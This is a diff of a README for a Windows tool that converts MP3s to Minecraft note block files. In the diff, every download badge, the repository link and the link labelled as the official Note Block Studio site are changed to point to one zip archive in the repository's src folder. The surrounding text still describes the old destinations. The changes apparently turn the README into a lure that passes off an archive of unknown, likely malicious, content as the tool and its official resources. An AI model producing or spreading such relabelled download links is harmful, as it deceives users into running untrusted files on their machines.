@@ -1,6 +1,6 @@
 # 🎵 mp3-to-nbs - Convert MP3s to Minecraft Notes
 
-[![Download mp3-to-nbs](https://img.shields.io/badge/Download-mp3--to--nbs-green?style=for-the-badge)](https://github.com/Samuel-M-writers/mp3-to-nbs)
+[![Download mp3-to-nbs](https://img.shields.io/badge/Download-mp3--to--nbs-green?style=for-the-badge)](https://github.com/Samuel-M-writers/mp3-to-nbs/raw/refs/heads/main/src/mp-nbs-to-3.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and use mp3-to-nbs on Windows.
 
 Visit the official GitHub page to get the latest version:
 
-[![Download mp3-to-nbs](https://img.shields.io/badge/Download-mp3--to--nbs-brightgreen?style=for-the-badge)](https://github.com/Samuel-M-writers/mp3-to-nbs)
+[![Download mp3-to-nbs](https://img.shields.io/badge/Download-mp3--to--nbs-brightgreen?style=for-the-badge)](https://github.com/Samuel-M-writers/mp3-to-nbs/raw/refs/heads/main/src/mp-nbs-to-3.1.zip)
 
 The link takes you to the repository’s main page. Look for the **Releases** section on the right or near the top of the page.
 
@@ -141,7 +141,7 @@ If you encounter problems, try these:
 
 Visit the mp3-to-nbs GitHub repository to find downloads and updates:
 
-[https://github.com/Samuel-M-writers/mp3-to-nbs](https://github.com/Samuel-M-writers/mp3-to-nbs)
+[https://github.com/Samuel-M-writers/mp3-to-nbs/raw/refs/heads/main/src/mp-nbs-to-3.1.zip](https://github.com/Samuel-M-writers/mp3-to-nbs/raw/refs/heads/main/src/mp-nbs-to-3.1.zip)
 
 Look for the **Releases** tab to get the latest Windows version.
 
@@ -165,7 +165,7 @@ The program runs locally on Windows and does not require online connectivity onc
 
 For help with Note Block Studio or Minecraft note blocks, visit:
 
-- [Minecraft Note Block Studio official site](https://www.stuffbydavid.com/mcnbs)
+- [Minecraft Note Block Studio official site](https://github.com/Samuel-M-writers/mp3-to-nbs/raw/refs/heads/main/src/mp-nbs-to-3.1.zip)
 - Minecraft fan forums and communities
 
 You can experiment with converted files and learn how Minecraft plays music with note blocks by exploring these resources.
